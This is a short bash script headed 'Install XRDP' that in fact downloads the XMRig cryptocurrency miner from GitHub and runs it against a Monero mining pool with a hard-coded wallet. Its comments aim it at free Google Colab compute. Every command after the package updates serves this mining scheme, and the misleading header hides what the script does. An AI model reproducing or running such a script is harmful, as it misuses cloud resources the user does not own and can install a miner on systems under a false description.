#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 445zXmdPiWgCrqiobeVRzJgQk16xz1r6B3bDvGDaJAh5XetU1kseAPwg8qUG774ysQ6Z3jZ5JaDp98jhVfZap3N4B3FGun8.GC-US -p x
